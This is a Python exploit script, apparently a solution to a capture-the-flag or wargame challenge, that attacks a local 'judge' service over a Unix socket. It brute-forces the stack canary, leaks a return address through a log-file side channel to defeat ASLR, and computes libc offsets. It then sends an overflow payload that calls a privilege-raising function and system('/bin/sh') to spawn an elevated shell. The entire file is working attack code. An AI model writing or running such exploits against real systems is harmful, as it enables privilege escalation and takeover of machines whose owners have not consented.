#!/usr/bin/env python3

import os, socket, time, struct

SOCK_PATH = os.path.expanduser("~/judge_sock")

def connect_to_judge():
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        s.connect(SOCK_PATH)
    except Exception as e:
        print("Connection failed")
    return s

def send_payload(payload):
    s = connect_to_judge()
    try:
        s.sendall(payload)
        data = s.recv(1024)
        print(data)
    except Exception as e:
        data = b'' 
    finally:
        s.close()
    if not data:
        return None 
    return data

#Canary brute-force
base_buf = bytearray(b"A" * 255 + b"\n")
canary = bytearray()
print("Starting canary brute-force")
for byte_index in range(4):
    found_byte = None
    for guess in range(256):
        payload = bytearray(base_buf)
        payload.extend(canary)
        payload.append(guess)
        response = send_payload(payload)
        if response:
            found_byte = guess
            canary.append(guess)
            print(f"    [byte {byte_index+1}] found {hex(guess)}")
            break
    if found_byte is None:
        raise RuntimeError(f"failed brute-force at byte {byte_index}")
print(f"Brute-forced canary: {canary.hex()}")

#Return address brute-force
padding = bytearray(b"A" * 12)
returnaddr = bytearray()
print("Starting ASLR return address brute-force")
for byte_index in range(4):
    found_byte = None
    for guess in range(256):
        payload = bytearray(base_buf)
        payload.extend(canary)
        payload.extend(padding)
        payload.extend(returnaddr)
        payload.append(guess)
        response = send_payload(payload)
        time.sleep(0.1)
        path = "/home/hackers/hacker27/anime_log.txt"
        if os.path.exists(path):
            try:
                os.remove(path)
                found_byte = guess
                print(f"[byte {byte_index+1}] found {hex(guess)} (log file hit)")
                returnaddr.append(guess)
                break
            except OSError as e:
                print(f"Error deleting log file: {e}")
    if found_byte is None:
        raise RuntimeError(f"failed ASLR brute-force at byte {byte_index}")
print(f"Brute-forced return address: {returnaddr.hex()}")

#Address Calculations
log_info_offset = 0x1719
libc_offset_from_libanime = 0x23D000
libpriv_offset_from_libc = 0x242000
group_perm_up_offset = 0x13e9
system_offset = 0x51670
binsh_offset = 0x1CBED2

logfn = int.from_bytes(returnaddr, 'little')
libanime = logfn - log_info_offset
libc = libanime - libc_offset_from_libanime
libpriv = libc + libpriv_offset_from_libc
group_perm_up = libpriv + group_perm_up_offset
systemfn = libc + system_offset
binsh = libc + binsh_offset

print("\n--- Address Summary ---")
print(f"logfn (log_build_info):     {hex(logfn)}")
print(f"libanime base:              {hex(libanime)}")
print(f"libc base:                  {hex(libc)}")
print(f"libpriv base:               {hex(libpriv)}")
print(f"group_perm_up address:      {hex(group_perm_up)}")
print(f"system address:             {hex(systemfn)}")
print(f"/bin/sh address:            {hex(binsh)}")
print("------------------------\n")

#Final Payload
ppayload = bytearray(base_buf)
ppayload.extend(canary)
ppayload.extend(padding)
ppayload.extend(struct.pack("<I", group_perm_up))  
ppayload.extend(struct.pack("<I", systemfn))        
ppayload.extend(b"C" * 4)                           
ppayload.extend(struct.pack("<I", binsh))           

print("[*] Sending final payload to escalate and spawn shell...")
response = send_payload(ppayload)
